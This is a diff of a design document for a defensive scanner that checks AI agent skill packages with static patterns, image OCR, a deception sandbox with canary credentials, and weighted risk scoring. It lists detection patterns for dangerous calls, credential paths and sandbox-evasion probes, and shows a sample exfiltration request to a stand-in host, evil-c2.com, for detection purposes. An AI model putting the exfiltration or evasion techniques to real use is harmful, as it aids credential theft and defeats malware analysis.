@@ -103,7 +103,7 @@ flowchart TD
 | **1** | Spec Validation + Typosquat | Enforce frontmatter rules (name; description 1–1024 chars with trigger keywords); Levenshtein distance ≤ 2 vs. known-skill names ⇒ typosquat flag (+15 risk bonus) | `python-frontmatter` + regex | Malformed package ⇒ `SUSPICIOUS` finding, pipeline continues |
 | **2** | Deterministic Anchor + Semantic | AST/regex pre-scan (`eval()`, `subprocess…shell=True`, `os.system()`, `base64.b64decode()`, credential paths, network calls…) → anchors injected as ground truth into the Gemma 4 E4B structured-JSON analysis | Python `ast` + regex → prompt template (§5.3 of plan) | Model unavailable ⇒ cloud fallback ⇒ anchors-only verdict |
 | **3** | Multimodal Vision Scan | Enumerate bundled images; Gemma 4 vision OCR for hidden text (white-on-white, 4–6 px, stego-style); SVG scanned **as text and rendered**; images downscaled to 1024 px; bounding boxes extracted for *Gemma's Eye View* | Vision scanner pipeline | No images ⇒ stage skipped (logged as `no-assets`) |
-| **4** | Context-Aware Behavioral Sandbox | Execute the skill in Docker (`python:3.11-slim`) with: masquerade layer, canary FS seeded from `declared_intent`, DNS sinkhole, fake HTTP responder; limits: 60 s timeout, 512 MB RAM, 1 CPU; egress restricted to the sinkhole network | Docker SDK; `LD_PRELOAD`; watchdog/inotify | Docker down ⇒ UI error state; verdict from static stages only, flagged `sandbox-unavailable` |
+| **4** | Context-Aware Behavioral Sandbox | Execute the skill in Docker (`skillsentry-sandbox:local`) with: masquerade layer, canary FS seeded from `declared_intent`, DNS sinkhole, fake HTTP responder; limits: 60 s timeout, 512 MB RAM, 1 CPU; egress restricted to the sinkhole network | Docker SDK; `LD_PRELOAD`; watchdog/inotify | Docker down ⇒ UI error state; verdict from static stages only, flagged `sandbox-unavailable` |
 | **4.5** | ☠️ Poisoned Well | On canary-path read: serve intent-matched fake credentials (marker `SKS-<8hex>`); log all DNS queries + HTTP bodies; correlate marker (raw/base64/hex/subdomain labels); fake HTTP responds `200 OK` + secondary canary to keep multi-stage malware talking; build attacker profile | Canary gen + sinkhole correlation engine | No canary read ⇒ stage inert (no deception events) |
 | **5** | Sandbox Evasion Detection | inotify on sensitive paths; detect probes for `/.dockerenv`, `/proc/1/cgroup`, disk checks (`df -h`), VM artifacts (`/proc/bus/input`); any probe ⇒ auto-`MALICIOUS`, `confidence: 1.0` | Masquerade hides artifacts so probes are observable and malware doesn't go dormant | Masquerade failure ⇒ treat as engine error, do **not** auto-pass |
 | **6** | Verdict Engine | Weighted fusion of all signals → risk score 0–100 → verdict tier → SARIF 2.1.0 JSON + Markdown + STIX → persist to SQLite cache | Weights in §2.4 | Any stage error is a finding, never a silent pass |
@@ -164,11 +164,11 @@ sequenceDiagram
         DNS->>PW: log query + payload
         PW->>PW: 🔍 decode → MATCH marker "SKS-8b2c"
     else HTTP exfiltration
-        SK->>HTTP: POST https://evil-c2.com/collect
+        SK->>HTTP: POST http://evil-c2.com/collect
         HTTP->>PW: log request body
         PW->>PW: 🔍 decode → MATCH marker "SKS-8b2c"
         PW->>HTTP: respond 200 OK + secondary canary
-        Note over HTTP: Keep malware talking — harvest IOCs
+        Note over HTTP: M1 does not intercept TLS; HTTPS traffic is not decoded
     end
 
     PW->>PW: Build Attacker Profile (targeted asset,<br/>channel, C2, encoding)
@@ -213,16 +213,20 @@ flowchart LR
     OVERRIDE --> T3
 ```
 
-**Fusion rule (implementation formula):** each signal source emits a normalized sub-score `sᵢ ∈ [0,100]`; the fused score is the weight-normalized sum plus the typosquat bonus, clamped to 100:
+**Fusion rule (implementation formula):** each signal source emits a normalized sub-score `sᵢ ∈ [0,100]`; the fused score is the weight-normalized sum plus the typosquat bonus, clamped to 100, then raised by explicit evidence floors:
 
 ```text
 riskScore = min(100, round( Σ(wᵢ·sᵢ) / Σ(wᵢ) ) + typosquatBonus)
 weights:  anchors 0.15 · semantic 0.20 · vision 0.20 · sandbox 0.25
-bonus:    typosquat detected ⇒ +15
-override: Poisoned Well correlation OR evasion probe ⇒ verdict = MALICIOUS,
-          riskScore = max(riskScore, 95), confidence = 1.0
+bonus:    typosquat detected ⇒ +15 (and a 30/SUSPICIOUS evidence floor)
+floors:   CRITICAL finding ⇒ ≥ 95 · HIGH ⇒ ≥ 70 · MEDIUM ⇒ ≥ 30
+override: Poisoned Well correlation ⇒ MALICIOUS, riskScore ≥ 95
+          evasion probe             ⇒ MALICIOUS, riskScore = 100
+          both override confidence = 1.0
 tiers:    SAFE < 30 ≤ SUSPICIOUS ≤ 70 < MALICIOUS
 ```
+
+The evidence floors are **not weights**: a single critical deterministic or vision finding cannot be averaged below `MALICIOUS` by several clean-looking model scores. `FusionResult.evidence_floor` records the applied floor for auditing. A degraded stage still forces `SUSPICIOUS` at minimum and can never leave a scan `SAFE`.
 
 **Design principle:** *LLM judgment + hard deterministic evidence = credible, not vibes.* Weights live in one config module so they are tunable and testable (see fixture-regression tests in [08-testing-and-evaluation.md](08-testing-and-evaluation.md)).
 
@@ -327,7 +331,7 @@ skillsentry/
 | Local model | **Gemma 4 E4B via Ollama (Q4)** | Laptop-feasible; latency tested night before; images downscaled if slow |
 | Cloud fallback | **Gemini API** (wired from M1) | Safety net per catalog rules; opt-in only |
 | Caching | **SQLite + `hashlib` (SHA-256)** | Instant < 2 s scans for unchanged skills |
-| Sandbox | **Docker** (`python:3.11-slim` base) | Portable, demonstrable, simple |
+| Sandbox | **Docker** (`skillsentry-sandbox:local` base) | Portable, demonstrable, simple |
 | Evasion defense | **`LD_PRELOAD` hooks / fake `/proc`** | Hides Docker artifacts from probing malware |
 | File monitoring | **watchdog / inotify** on canary paths | Lightweight, reliable |
 | DNS interception | **Sinkhole resolver** in-container (all DNS → local logger on :53) | Catches exfil-by-DNS; no iptables complexity |
